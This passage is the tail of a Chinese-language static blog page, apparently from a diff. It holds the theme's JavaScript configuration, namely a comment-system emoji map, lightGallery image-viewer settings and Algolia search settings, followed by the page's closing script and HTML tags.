73.png","pensive":"1f614.png","persevere":"1f623.png","pleading_face":"1f97a.png","pouting_cat":"1f63e.png","purple_heart":"1f49c.png","rage":"1f621.png","relaxed":"263a-fe0f.png","relieved":"1f60c.png","revolving_hearts":"1f49e.png","right_anger_bubble":"1f5ef-fe0f.png","robot_face":"1f916.png","rolling_on_the_floor_laughing":"1f923.png","scream":"1f631.png","scream_cat":"1f640.png","see_no_evil":"1f648.png","shushing_face":"1f92b.png","skull":"1f480.png","skull_and_crossbones":"2620-fe0f.png","sleeping":"1f634.png","sleepy":"1f62a.png","slightly_frowning_face":"1f641.png","slightly_smiling_face":"1f642.png","smile":"1f604.png","smile_cat":"1f638.png","smiley":"1f603.png","smiley_cat":"1f63a.png","smiling_face_with_3_hearts":"1f970.png","smiling_imp":"1f608.png","smirk":"1f60f.png","smirk_cat":"1f63c.png","sneezing_face":"1f927.png","sob":"1f62d.png","space_invader":"1f47e.png","sparkling_heart":"1f496.png","speak_no_evil":"1f64a.png","speech_balloon":"1f4ac.png","star-struck":"1f929.png","stuck_out_tongue":"1f61b.png","stuck_out_tongue_closed_eyes":"1f61d.png","stuck_out_tongue_winking_eye":"1f61c.png","sunglasses":"1f60e.png","sweat":"1f613.png","sweat_drops":"1f4a6.png","sweat_smile":"1f605.png","thinking_face":"1f914.png","thought_balloon":"1f4ad.png","tired_face":"1f62b.png","triumph":"1f624.png","two_hearts":"1f495.png","unamused":"1f612.png","upside_down_face":"1f643.png","weary":"1f629.png","white_frowning_face":"2639-fe0f.png","white_heart":"1f90d.png","wink":"1f609.png","woozy_face":"1f974.png","worried":"1f61f.png","yawning_face":"1f971.png","yellow_heart":"1f49b.png","yum":"1f60b.png","zany_face":"1f92a.png","zipper_mouth_face":"1f910.png","zzz":"1f4a4.png"},"enableQQ":false,"highlight":true,"lang":"zh-cn","pageSize":10,"placeholder":"人世纷乱，出入平安。","recordIP":true,"visitor":true}},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.zh-cn","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
